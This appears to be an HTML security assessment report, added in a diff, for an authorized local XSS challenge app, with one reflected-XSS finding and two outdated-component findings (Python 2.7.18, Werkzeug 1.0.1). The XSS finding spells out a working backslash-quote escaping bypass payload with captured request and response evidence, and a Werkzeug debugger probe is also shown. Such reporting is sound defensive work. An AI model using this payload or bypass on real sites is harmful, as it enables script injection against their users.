@@ -1,0 +1,365 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqz52bhu-3y7bo1</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [xss-reflected] Reflected XSS via JS-string injection in name param (GET /page)</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] End-of-life Python 2.7.18 runtime — unpatched CVEs (CVE-2021-3177, CVE-2021-23336)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] Outdated Werkzeug 1.0.1 — known DoS CVEs (CVE-2023-25577, CVE-2024-49767) + conditional debugger RCE (CVE-2024-34069)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqz52bhu-3y7bo1</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32875/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T11:32:53.534Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>3</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32875</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>3 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">2</b> medium</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [xss-reflected] Reflected XSS via JS-string injection in name param (GET /page)</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32875/</div>
+<div class="desc">The `name` query parameter is reflected server-side directly into a `&lt;script&gt;` block as a double-quoted JavaScript string literal: `var name = &quot;VALUE&quot;; document.write('Hello ' + name);`. The server escapes `&quot;` → `\&quot;` and `\` → `\\` independently, but the combination `\&quot;` in the input produces `\\&quot;` in the output — in JavaScript, `\\` is a literal backslash and the following `&quot;` closes the string, allowing arbitrary code execution. Sending `?name=\&quot;;alert(1)//` causes `alert(1)` to execute; the challenge app's server-side JS executor confirms this with the response message &quot;You did an alert with 1 instead of 'XSS'&quot;.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32875/page?name=%5C%22%3Balert%281%29%2F%2F (URL-decoded: name=\&quot;;alert(1)//)\n2. Observe the injected script block: `var name = &quot;\\&quot;`;alert(1)//&quot;;`\n3. In the browser, `\\` evaluates to a literal backslash, the following `&quot;` closes the string, and `;alert(1)` executes.\n4. Server response confirms: &quot;You did an alert with 1 instead of 'XSS'&quot;</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz57v71-d</code> — <code>artifacts/s-0002/ev-mqz57v71-d/</code></div><div class="lbl">REQUEST</div><pre>GET /page HTTP/1.1
+Host: target.local:32875
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1009
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:37:12 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+x-xss-protection: 0
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss30.css&quot;&gt;
+            &lt;title&gt;Dalgona - Umbrella&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;script&gt; var name = &quot;&quot;; document.write('Hello ' + name); &lt;/script&gt;&lt;/div&gt;
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/new_umbrella.png&quot; alt=&quot;Start&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Let the game begin. Good Luck&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5a61t-i</code> — <code>artifacts/s-0002/ev-mqz5a61t-i/</code></div><div class="lbl">REQUEST</div><pre>GET /page?name=%5C%22%3Balert%281%29%2F%2F HTTP/1.1
+Host: target.local:32875
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1041
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:38:59 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+x-xss-protection: 0
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss30.css&quot;&gt;
+            &lt;title&gt;Dalgona - Umbrella&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;script&gt; var name = &quot;\\&quot;;alert(1)//&quot;; document.write('Hello ' + name); &lt;/script&gt;&lt;/div&gt;
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_umbrella.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with 1 instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5bd3a-k</code> — <code>artifacts/s-0002/ev-mqz5bd3a-k/</code></div><div class="lbl">REQUEST</div><pre>GET /page?name=%5C%22%3Balert%281%29%2F%2F HTTP/1.1
+Host: target.local:32875
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1041
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:39:55 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+x-xss-protection: 0
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss30.css&quot;&gt;
+            &lt;title&gt;Dalgona - Umbrella&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;script&gt; var name = &quot;\\&quot;;alert(1)//&quot;; document.write('Hello ' + name); &lt;/script&gt;&lt;/div&gt;
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_umbrella.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with 1 instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 2. [vulnerable-component] End-of-life Python 2.7.18 runtime — unpatched CVEs (CVE-2021-3177, CVE-2021-23336)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32875/</div>
+<div class="desc">The application runs on Python 2.7.18, disclosed in the HTTP Server response header on every response: `Server: Werkzeug/1.0.1 Python/2.7.18` (observed repeatedly on GET /). Python 2.7.18 (April 2020) is the FINAL Python 2 release; Python 2 reached end-of-life on 2020-01-01 and receives NO further security patches. Any CVE found after that date is permanently unpatched here, including: CVE-2021-3177 (stack buffer overflow in `PyCArg_repr` / `_ctypes/callproc.c`, memory corruption / potential RCE when ctypes processes attacker-influenced floats), CVE-2021-23336 (`urllib.parse` query-parameter smuggling → web-cache poisoning via `;`), and CVE-2022-0391 (`urllib.parse` control-character stripping). VERSION-BASED finding: matched from the Server banner, not exploited. The version is confirmed by the banner but the individual CVEs were NOT actively triggered — CVE-2021-3177 in particular is conditional on the app passing attacker-controlled data into ctypes. Operator should verify the interpreter and migrate off Python 2. Note: the Werkzeug dev WSGI server is being used to serve the app, which is not intended for production exposure.</div>
+<div><b>Reproduction</b></div><pre>1. Send `GET /` to http://target.local:32875/. 2. Inspect the response `Server` header: `Werkzeug/1.0.1 Python/2.7.18`. 3. Cross-reference 2.7.18 as the terminal, EOL Python 2 release with no patches for CVE-2021-3177 / CVE-2021-23336 / CVE-2022-0391.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5gw0u-w</code> — <code>artifacts/_/ev-mqz5gw0u-w/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-verdict-control-xyz HTTP/1.1
+Host: target.local:32875
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 232
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:44:13 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5fh6s-t</code> — <code>artifacts/_/ev-mqz5fh6s-t/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32875
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1090
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:43:07 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    	&lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/index.css&quot;&gt;
+            &lt;title&gt;Dalgona Challenges&lt;/title&gt;
+        &lt;/head&gt;
+
+	        &lt;article class=&quot;widget widget__login&quot;&gt;
+	        &lt;div class=&quot;widget__content&quot;&gt;
+	    		&lt;div class=&quot;box&quot;&gt;
+	                &lt;form class=&quot;box-form&quot;&gt;
+	                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+				        &lt;h1&gt;Dalgona Challenges&lt;/h1&gt;
+	                    &lt;div class=&quot;init-table&quot;&gt;
+                            &lt;div class=&quot;row&quot;&gt;
+                                &lt;div class=&quot;column&quot;&gt;&lt;a class=&quot;text&quot; type=text href=&quot;page&quot;&gt;&lt;img src=&quot;static/img/cookies/new_star.png&quot; alt=&quot;Star&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;Page&lt;/a&gt;&lt;/div&gt;
+				            &lt;/div&gt;
+                        &lt;/br&gt;
+				        &lt;/div&gt;
+				        &lt;/br&gt;
+				        &lt;/br&gt;
+				        &lt;p&gt;&lt;/p&gt;
+	                &lt;/form&gt;
+	                &lt;/br&gt;
+				&lt;/div&gt;
+	        &lt;/div&gt;
+	    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5gt29-u</code> — <code>artifacts/_/ev-mqz5gt29-u/</code></div><div class="lbl">REQUEST</div><pre>GET /?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js HTTP/1.1
+Host: target.local:32875
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1090
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:44:09 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    	&lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/index.css&quot;&gt;
+            &lt;title&gt;Dalgona Challenges&lt;/title&gt;
+        &lt;/head&gt;
+
+	        &lt;article class=&quot;widget widget__login&quot;&gt;
+	        &lt;div class=&quot;widget__content&quot;&gt;
+	    		&lt;div class=&quot;box&quot;&gt;
+	                &lt;form class=&quot;box-form&quot;&gt;
+	                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+				        &lt;h1&gt;Dalgona Challenges&lt;/h1&gt;
+	                    &lt;div class=&quot;init-table&quot;&gt;
+                            &lt;div class=&quot;row&quot;&gt;
+                                &lt;div class=&quot;column&quot;&gt;&lt;a class=&quot;text&quot; type=text href=&quot;page&quot;&gt;&lt;img src=&quot;static/img/cookies/new_star.png&quot; alt=&quot;Star&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;Page&lt;/a&gt;&lt;/div&gt;
+				            &lt;/div&gt;
+                        &lt;/br&gt;
+				        &lt;/div&gt;
+				        &lt;/br&gt;
+				        &lt;/br&gt;
+				        &lt;p&gt;&lt;/p&gt;
+	                &lt;/form&gt;
+	                &lt;/br&gt;
+				&lt;/div&gt;
+	        &lt;/div&gt;
+	    &lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [vulnerable-component] Outdated Werkzeug 1.0.1 — known DoS CVEs (CVE-2023-25577, CVE-2024-49767) + conditional debugger RCE (CVE-2024-34069)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32875/</div>
+<div class="desc">The WSGI layer is Werkzeug 1.0.1 (March 2020), disclosed in the Server response header on every response: `Server: Werkzeug/1.0.1 Python/2.7.18` (observed repeatedly on GET /). Known issues fixed in later releases that affect 1.0.1: CVE-2023-25577 (MultiPartParser resource exhaustion / DoS via many multipart parts, fixed 2.2.3), CVE-2024-49767 (`max_form_memory_size` not enforced on multipart parts → memory-exhaustion DoS, fixed 3.0.6), and CVE-2023-23934 (cookie-parsing edge case, low). CVE-2024-34069 (interactive-debugger RCE under cross-site + PIN-entry conditions, fixed 3.0.3) applies by version — HOWEVER an active probe for the debugger resource (`GET /?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js`) returned the normal application page rather than the debugger JavaScript, indicating the interactive debugger / debug mode is NOT exposed, so the debugger RCE is not exploitable as deployed. VERSION-BASED finding matched from the Server banner; the DoS CVEs were not actively triggered (a DoS test is destructive / out of scope). Severity set by the worst SAFELY-applicable issue (DoS, medium); the conditional debugger RCE is downgraded because the active check shows it is not exposed. Recommendation: upgrade Werkzeug to a current 3.x release and stop serving via the Werkzeug development server.</div>
+<div><b>Reproduction</b></div><pre>1. Send `GET /` to http://target.local:32875/. 2. Inspect the `Server` header: `Werkzeug/1.0.1 Python/2.7.18`. 3. Map 1.0.1 against fixed-in versions: CVE-2023-25577 (&lt;2.2.3), CVE-2024-49767 (&lt;3.0.6), CVE-2024-34069 (&lt;3.0.3). 4. Debugger exposure actively checked via `GET /?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js` → returned the normal page (not debugger JS), so debug console is not exposed.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5gw0u-w</code> — <code>artifacts/_/ev-mqz5gw0u-w/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-verdict-control-xyz HTTP/1.1
+Host: target.local:32875
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 232
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:44:13 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5fh6s-t</code> — <code>artifacts/_/ev-mqz5fh6s-t/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32875
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1090
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:43:07 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    	&lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/index.css&quot;&gt;
+            &lt;title&gt;Dalgona Challenges&lt;/title&gt;
+        &lt;/head&gt;
+
+	        &lt;article class=&quot;widget widget__login&quot;&gt;
+	        &lt;div class=&quot;widget__content&quot;&gt;
+	    		&lt;div class=&quot;box&quot;&gt;
+	                &lt;form class=&quot;box-form&quot;&gt;
+	                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+				        &lt;h1&gt;Dalgona Challenges&lt;/h1&gt;
+	                    &lt;div class=&quot;init-table&quot;&gt;
+                            &lt;div class=&quot;row&quot;&gt;
+                                &lt;div class=&quot;column&quot;&gt;&lt;a class=&quot;text&quot; type=text href=&quot;page&quot;&gt;&lt;img src=&quot;static/img/cookies/new_star.png&quot; alt=&quot;Star&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;Page&lt;/a&gt;&lt;/div&gt;
+				            &lt;/div&gt;
+                        &lt;/br&gt;
+				        &lt;/div&gt;
+				        &lt;/br&gt;
+				        &lt;/br&gt;
+				        &lt;p&gt;&lt;/p&gt;
+	                &lt;/form&gt;
+	                &lt;/br&gt;
+				&lt;/div&gt;
+	        &lt;/div&gt;
+	    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5gt29-u</code> — <code>artifacts/_/ev-mqz5gt29-u/</code></div><div class="lbl">REQUEST</div><pre>GET /?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js HTTP/1.1
+Host: target.local:32875
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1090
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:44:09 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    	&lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/index.css&quot;&gt;
+            &lt;title&gt;Dalgona Challenges&lt;/title&gt;
+        &lt;/head&gt;
+
+	        &lt;article class=&quot;widget widget__login&quot;&gt;
+	        &lt;div class=&quot;widget__content&quot;&gt;
+	    		&lt;div class=&quot;box&quot;&gt;
+	                &lt;form class=&quot;box-form&quot;&gt;
+	                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+				        &lt;h1&gt;Dalgona Challenges&lt;/h1&gt;
+	                    &lt;div class=&quot;init-table&quot;&gt;
+                            &lt;div class=&quot;row&quot;&gt;
+                                &lt;div class=&quot;column&quot;&gt;&lt;a class=&quot;text&quot; type=text href=&quot;page&quot;&gt;&lt;img src=&quot;static/img/cookies/new_star.png&quot; alt=&quot;Star&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;Page&lt;/a&gt;&lt;/div&gt;
+				            &lt;/div&gt;
+                        &lt;/br&gt;
+				        &lt;/div&gt;
+				        &lt;/br&gt;
+				        &lt;/br&gt;
+				        &lt;p&gt;&lt;/p&gt;
+	                &lt;/form&gt;
+	                &lt;/br&gt;
+				&lt;/div&gt;
+	        &lt;/div&gt;
+	    &lt;/html&gt;</pre></div>
+</div>
+</body></html>
